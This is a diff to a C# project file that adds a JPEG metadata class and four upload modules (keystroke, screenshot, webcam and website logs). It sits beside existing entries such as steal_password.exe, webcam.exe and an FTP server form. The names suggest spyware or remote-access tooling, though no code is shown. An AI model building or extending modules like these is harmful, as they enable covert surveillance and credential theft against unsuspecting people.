@@ -94,6 +94,7 @@
       <HintPath>..\packages\System.Data.SQLite.Core.1.0.108.0\lib\net46\System.Data.SQLite.dll</HintPath>
     </Reference>
     <Reference Include="System.DirectoryServices" />
+    <Reference Include="System.Drawing" />
     <Reference Include="System.Windows.Forms" />
     <Reference Include="System.Xml" />
     <Reference Include="Microsoft.CSharp" />
@@ -144,6 +145,7 @@
       <DependentUpon>FTP_Server.xaml</DependentUpon>
     </Compile>
     <Compile Include="Functions.cs" />
+    <Compile Include="JpegMetadataAdapter.cs" />
     <Compile Include="LoginForm.xaml.cs">
       <DependentUpon>LoginForm.xaml</DependentUpon>
     </Compile>
@@ -324,6 +326,10 @@
     <Content Include="module\steal_password.exe" />
     <Content Include="module\sync.exe" />
     <Content Include="module\sync_up.exe" />
+    <Content Include="module\upKeystrokeLog.exe" />
+    <Content Include="module\upScreenshot.exe" />
+    <Content Include="module\upWebcamLog.exe" />
+    <Content Include="module\upWebsiteLog.exe" />
     <Content Include="module\webcam.exe" />
     <Content Include="module\website_usage.exe" />
   </ItemGroup>
